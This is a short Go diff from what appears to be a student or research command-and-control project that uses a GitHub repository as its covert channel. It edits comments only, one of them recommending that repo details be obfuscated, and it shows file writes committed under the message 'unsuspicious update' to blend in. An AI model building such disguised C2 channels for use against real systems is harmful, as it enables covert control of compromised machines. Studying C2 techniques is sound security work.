@@ -12,7 +12,7 @@ import (
 
 var GithubToken string // to be assigned at compile time using ldflags
 
-// in a real implementation you'd wanna hide repo details a little better
+// in a real implementation you'd wanna obfuscate repo details a little better
 const repoOwner = "SurainSaigal"
 const repoName = "c2-project-ethical"
 
@@ -59,7 +59,7 @@ func WriteFile(filePath string, prevContent string, newContent string) error {
 	payload := map[string]string{
 		"message": "unsuspicious update",
 		"content": encodedContent,
-		"sha":     calculateGitSHA(prevContent),
+		"sha":     calculateGitSHA(prevContent), // prev sha required to prevent conflicting updates
 	}
 	jsonData, _ := json.Marshal(payload)
 
